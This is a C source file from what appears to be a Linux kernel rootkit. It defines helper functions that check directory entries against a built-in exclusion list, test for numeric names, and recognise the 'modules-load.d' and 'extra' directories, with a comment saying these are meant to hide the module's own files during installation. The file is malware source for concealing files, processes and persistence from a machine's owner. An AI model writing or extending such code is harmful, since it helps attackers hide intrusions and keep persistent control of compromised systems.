#include <linux/fs.h>
#include <linux/file.h>
#include <linux/string.h>

#include "utils/excludes/string_filtering.h"

int strings_exclusions_are_empty() {
    return STRING_EXCLUDES[0] == '\0';
}

int str_entry_is_excluded(const char *entry) {
    if (strings_exclusions_are_empty()) { // no string excludes were set
        return 0;
    }

    char excludes[] = STRING_EXCLUDES; // copy to a mutable array
    char *token;
    char *temp_excludes = excludes; // `strsep` modifies the original string

    while ((token = strsep(&temp_excludes, ",")) != NULL) {
        if (token[0]== '\0') { // skip empty entries due to misplaced commas i.e "str,"
            continue;
        }
        if (strstr(entry, token)) {
            return 1;
        }
    }
    return 0;
}

// function to check if a string contains only numeric characters
bool is_numeric(const char *str) {
    int i;
    if (!str || !str[0])
        return false;
    for (i = 0; str[i] != '\0'; i++) {
        if (str[i] < '0' || str[i] > '9')
            return false;
    }
    return true;
}

bool is_mod_directory(unsigned int fd) { // will be used to hide the module files if installing
    struct file *file = fget(fd);
    if (!file) {
        return false;
    }

    struct dentry *dentry = file->f_path.dentry;
    const char *dname = dentry->d_name.name;

    bool match = false;
    if (strcmp(dname, "modules-load.d") == 0 || strcmp(dname, "extra") == 0) {
        match = true;
    }

    fput(file);
    return match;
}
